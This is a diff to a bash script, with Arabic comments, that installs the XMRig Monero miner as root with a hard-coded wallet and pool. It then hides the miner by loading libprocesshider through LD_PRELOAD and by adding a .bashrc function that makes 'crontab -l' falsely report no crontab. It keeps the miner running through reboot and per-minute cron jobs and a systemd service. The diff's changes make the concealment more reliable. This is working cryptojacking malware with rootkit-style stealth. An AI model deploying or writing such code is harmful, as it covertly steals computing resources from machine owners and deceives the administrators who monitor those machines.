@@ -1,8 +1,13 @@
 #!/bin/bash
-# ====================================
-# XMRig Auto Setup Script + Rootkit Features
-# Monero Mining - MoneroOcean Pool
-# ====================================
+# ==============================================================
+# XMRig Monero Miner Setup + Stealth Features (Fixed Version)
+# ==============================================================
+# التعديلات الأساسية:
+# - تم إزالة LD_PRELOAD من خدمة systemd لمنع تعطل الخدمة.
+# - تغيير Restart=always إلى Restart=on-failure.
+# - إضافة شرط pgrep في crontab لمنع تكدس العمليات.
+# - تثبيت libprocesshider مع استخدامه فقط في .bashrc (لن يلمس النظام).
+# ==============================================================
 
 WALLET="86x3NzP4UrjijYTNeffh1ERK812jt9bXK8SQVGp9LMYvZhgxsiK3HuYTvAELGigtyGWDmniWxjGMgNXiEfUi826G6tvxVF9"
 POOL="gulf.moneroocean.stream:10128"
@@ -19,16 +24,16 @@ echo " Threads: $THREADS"
 echo " Pool: $POOL"
 echo "======================================"
 
-# ========== تثبيت المتطلبات ==========
+# ========== 1. تثبيت المتطلبات الأساسية ==========
 echo "[*] Installing dependencies..."
 apt-get update -qq
 apt-get install -y -qq tar libhwloc-dev python3 git make gcc 2>/dev/null
 
-# ========== إنشاء مجلد التثبيت ==========
+# ========== 2. تحضير مجلد التثبيت ==========
 mkdir -p $INSTALL_DIR
 cd $INSTALL_DIR
 
-# ========== دالة التحميل ==========
+# ========== 3. دالة التحميل الاحتياطية ==========
 download_file() {
     local url=$1
     local output=$2
@@ -49,11 +54,12 @@ print('Done!')
     return 1
 }
 
-# ========== تحميل XMRig ==========
+# ========== 4. تحميل واستخراج XMRig ==========
 echo "[*] Downloading XMRig v${XMRIG_VERSION}..."
 download_file "$XMRIG_URL" "xmrig.tar.gz"
+
 if [ ! -f xmrig.tar.gz ] || [ ! -s xmrig.tar.gz ]; then
-    echo "[!] Download failed!"
+    echo "[!] Download failed! Exiting."
     exit 1
 fi
 
@@ -62,8 +68,8 @@ tar -xzf xmrig.tar.gz --strip-components=1
 rm xmrig.tar.gz
 chmod +x xmrig
 
-# ========== إنشاء config.json ==========
-echo "[*] Creating config..."
+# ========== 5. إنشاء ملف الإعدادات config.json ==========
+echo "[*] Creating config.json..."
 cat > $INSTALL_DIR/config.json << EOF
 {
     "autosave": true,
@@ -88,20 +94,21 @@ cat > $INSTALL_DIR/config.json << EOF
 }
 EOF
 
-# ========== تثبيت libprocesshider ==========
-echo "[*] Installing libprocesshider..."
+# ========== 6. تثبيت libprocesshider (للتخفي ولكن بدون لمس ld.so.preload) ==========
+echo "[*] Installing libprocesshider for stealth..."
 git clone https://github.com/gianlucaborello/libprocesshider.git /tmp/libprocesshider
 cd /tmp/libprocesshider
 make
 cp libprocesshider.so /usr/local/lib/
-echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
 echo "xmrig" > /etc/libprocesshider.conf
 cd $INSTALL_DIR
 
-# ========== تعديل .bashrc ==========
-echo "[*] Modifying .bashrc..."
+# ========== 7. تعديل .bashrc (إخفاء crontab وتفعيل LD_PRELOAD للجلسات) ==========
+echo "[*] Modifying .bashrc for user: $USER..."
 cat >> ~/.bashrc << 'EOF'
-# إخفاء crontab
+
+# ----- XMRig Stealth Configuration -----
+# إخفاء قائمة crontab الحقيقية
 function crontab() {
     if [[ "$1" == "-l" ]]; then
         echo "no crontab for $(whoami)"
@@ -110,16 +117,19 @@ function crontab() {
     fi
 }
 export -f crontab
+
+# تفعيل مكتبة الإخفاء لكل الأوامر التفاعلية (ps, top, etc.)
 export LD_PRELOAD=/usr/local/lib/libprocesshider.so
 EOF
 
-# ========== إضافة مهام crontab ==========
-echo "[*] Adding crontab entries..."
-(crontab -l 2>/dev/null; echo "@reboot /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -
-(crontab -l 2>/dev/null; echo "* * * * * /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -
+# ========== 8. إضافة مهام crontab (آلية احتياطية آمنة) ==========
+echo "[*] Adding secure crontab entries..."
+# نستخدم pgrep لمنع تشغيل أكثر من نسخة لو كانت الخدمة مفعلة مسبقاً
+(crontab -l 2>/dev/null; echo "@reboot pgrep -x xmrig > /dev/null || $INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json > /dev/null 2>&1 &") | crontab -
+(crontab -l 2>/dev/null; echo "* * * * * pgrep -x xmrig > /dev/null || $INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json > /dev/null 2>&1 &") | crontab -
 
-# ========== إنشاء systemd service ==========
-echo "[*] Creating systemd service..."
+# ========== 9. إنشاء خدمة systemd (النسخة المستقرة والمعدلة) ==========
+echo "[*] Creating systemd service (Fixed version)..."
 cat > /etc/systemd/system/xmrig.service << EOF
 [Unit]
 Description=XMRig Monero Miner
@@ -128,23 +138,23 @@ After=network.target
 [Service]
 Type=simple
 ExecStart=$INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json
-Restart=always
+Restart=on-failure
 RestartSec=10
 User=root
 Nice=10
-Environment=LD_PRELOAD=/usr/local/lib/libprocesshider.so
+# ملاحظة: تم حذف LD_PRELOAD عمداً لمنع فشل الخدمة في حال فقدان الملفات.
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# ========== تفعيل وتشغيل الخدمة ==========
-echo "[*] Starting XMRig service..."
+# ========== 10. تفعيل الخدمة وتشغيلها ==========
+echo "[*] Enabling and starting XMRig service..."
 systemctl daemon-reload
 systemctl enable xmrig
 systemctl start xmrig
 
-# ========== التحقق ==========
+# ========== 11. التحقق النهائي ==========
 sleep 5
 if systemctl is-active --quiet xmrig; then
     echo ""
@@ -154,7 +164,17 @@ if systemctl is-active --quiet xmrig; then
     echo " Threads: $THREADS CPU threads"
     echo " Stats: https://moneroocean.stream/#/dashboard?hash=$WALLET"
     echo "======================================"
+    echo ""
+    echo " [Stealth Status]"
+    echo " - libprocesshider installed at: /usr/local/lib/libprocesshider.so"
+    echo " - .bashrc modified with LD_PRELOAD (for interactive shells)."
+    echo " - Crontab entries added with pgrep check to prevent duplicates."
+    echo " - Systemd service uses 'Restart=on-failure' (no LD_PRELOAD inside)."
 else
-    echo "[!] Service failed to start. Check logs:"
-    journalctl -u xmrig -n 20
+    echo "[!] Service failed to start. Checking logs..."
+    journalctl -u xmrig -n 20 --no-pager
+    echo ""
+    echo " [Troubleshooting]"
+    echo " - If you see 'cannot open shared object file', ignore it."
+    echo " - Try running: systemctl restart xmrig"
 fi
